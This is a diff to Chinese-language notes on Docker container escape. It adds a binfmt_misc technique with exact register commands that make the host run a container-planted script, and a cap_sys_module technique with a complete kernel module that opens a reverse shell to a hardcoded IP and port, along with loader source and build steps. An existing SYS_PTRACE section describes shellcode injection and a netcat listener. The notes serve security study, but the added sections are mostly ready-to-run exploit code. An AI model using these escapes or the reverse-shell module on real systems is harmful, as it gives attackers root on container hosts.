@@ -1350,15 +1350,80 @@ Segmentation fault
 kill -11 "$$"
 ```
 
+### 4.3 binfmt_misc
+
+环境，将`binfmt_misc`挂载在容器中：
+
+```bash
+docker run -it --name binfmt_misc --security-opt apparmor:unconfined --cap-add SYS_ADMIN ubuntu:22.04
+
+mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc
+mount -o rw,remount /proc/sys
+```
+
+Linux内核有一个名为Miscellaneous Binary Format（binfmt_misc）的机制，可以通过要打开文件的特性来选择到底使用哪个程序来打开。这种机制可以通过文件的扩展名或文件开始位置的特殊的字节（Magic Byte）来判断应该如何打开文件。
 
 
 
+通过写`/proc/sys/fs/binfmt_misc/register`来注册一个拦截器，拦截器将自动拦截magic byte为我们设置的字节的可执行文件，交给拦截器来执行，从来实现容器逃逸。
 
-## 5.SYS_PTRACE安全风险
+这种容器逃逸需要拦截的是宿主机的可执行文件。
+
+其 binfmt 的格式如下：
+
+```
+name:type:offset:magic:mask:interpreter:flags
+```
+
+这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。 各个字段的意义如下：
+
+- name：规则名
+- type：表示如何匹配被打开的文件，值为 E 或 M 。E 表示根据扩展名识别，而 M 表示根据文件特定位置的Magic Bytes来识别
+- offset：type字段设置成 M 之后有效，表示查找Magic Bytes的偏移，默认为0
+- magic：表示要匹配的Magic Bytes，type字段为 M 时，表示文件的扩展名，扩展名是大小写敏感的，不需要包含 .。type字段为 E 时，表示Magic Bytes，其中不可见字符可以通过 \xff 的方式来输出
+- mask：type字段设置成 M 之后有效，长度与Magic Bytes的长度一致。如果某一位为1，表magic对应的位匹配，为0则忽略。默认为全部匹配
+- interpreter：启动文件的程序，需要是绝对路径
+- flags: 可选字段，控制interpreter打开文件的行为。共支持 POCF 四种flag。
+
+
+
+```bash
+#容器上执行
+mount|grep -i "upperdir"
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/OIPS7XI32CDHOFUSV7QR5IUSYD:/var/lib/docker/overlay2/l/ZR2BR7ZSSDQWVKIYYV4CDWAAMN,upperdir=/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff,workdir=/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/work)
+#容器上执行
+echo ":feng:M::\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68::/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff/tmp/exploit:" > /proc/sys/fs/binfmt_misc/register 
+#容器上执行
+echo '#!/bin/bash'>/tmp/exploit
+#容器上执行
+echo 'cat /flag > /var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff/tmp/flag' >> /tmp/exploit
+#宿主机上执行
+echo '#!/bin/sh'> /tmp/test.sh
+#宿主机上执行
+echo 'echo test'>> /tmp/test.sh
+#宿主机上执行
+./1.sh
+#容器上执行
+cat /tmp/flag
+```
+
+
+
+拦截ls的例子：
+
+```bash
+echo ":feng:M:208:\xd0\x35::/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff/tmp/exploit:" > /proc/sys/fs/binfmt_misc/register 
+```
+
+因为ls这个可执行文件偏移208个字节为`\xd0\x35`。如果要拦截其他可执行文件同理。
+
+
+
+## 5.特权CAP
+
+### 5.1 SYS_PTRACE安全风险
 
 SYS_PTRACE权限的作用是允许跟踪任何进程。可以挟持进程实现shellcode的注入。利用方式类似进程注入。从docker内部注入宿主机的root进程，再通过shellcode将shell连接到攻击机上面
-
-
 
 利用前提：
 
@@ -1509,6 +1574,186 @@ nc -lvvp 39876
 即可反弹到shell。
 
 （本地没有复现）
+
+### 5.2 cap_sys_module
+
+cap_sys_module特权表示允许加载内核模块，直接新建一个命令执行的模块即可拿到宿主机权限。（因为容器和宿主机共享内核）
+
+`Makefile`:
+
+```
+obj-m +=exp.o
+
+all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+```
+
+`exp.c`：
+
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/121.5.169.223/39123 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+
+`insmod.c`：
+
+```c
+#define _GNU_SOURCE
+
+#include <fcntl.h>
+
+#include <stdio.h>
+
+#include <sys/stat.h>
+
+#include <sys/syscall.h>
+
+#include <sys/types.h>
+
+#include <unistd.h>
+
+#include <stdlib.h>
+
+#define init_module(module_image, len, param_values) syscall(__NR_init_module, module_image, len, param_values)
+
+#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)
+
+
+
+int main(int argc, char **argv) {
+
+    const char *params;
+
+int fd, use_finit;
+
+size_t image_size;
+
+struct stat st;
+
+void *image;
+
+
+
+/* CLI handling. */
+
+if (argc < 2) {
+
+    puts("Usage ./insmod.o mymodule.ko [args="" [use_finit=0]");
+
+return EXIT_FAILURE;
+
+}
+
+if (argc < 3) {
+
+params = "";
+
+} else {
+
+params = argv[2];
+
+}
+
+if (argc < 4) {
+
+use_finit = 0;
+
+} else {
+
+use_finit = (argv[3][0] != '0');
+
+}
+
+
+
+/* Action. */
+
+   fd = open(argv[1], O_RDONLY);
+
+if (use_finit) {
+
+puts("finit");
+
+if (finit_module(fd, params, 0) != 0) {
+
+perror("finit_module");
+
+return EXIT_FAILURE;
+
+}
+
+close(fd);
+
+} else {
+
+    puts("init");
+
+fstat(fd, &st);
+
+image_size = st.st_size;
+
+image = malloc(image_size);
+
+read(fd, image, image_size);
+
+close(fd);
+
+if (init_module(image, image_size, params) != 0) {
+
+perror("init_module");
+
+return EXIT_FAILURE;
+
+}
+
+free(image);
+
+}
+
+return EXIT_SUCCESS;
+
+}
+
+```
+
+
+
+编译：
+
+```bash
+#生成exp.ko
+make
+#生成insmod.o
+gcc insmod.c -o insmod.o
+
+```
+
+将这两个文件放到目标主机上后加载：
+
+```bash
+./insmod.o exp.ko
+init
+```
+
+即可实现容器逃逸。
 
 ## 6.利用高权限Service Account
 
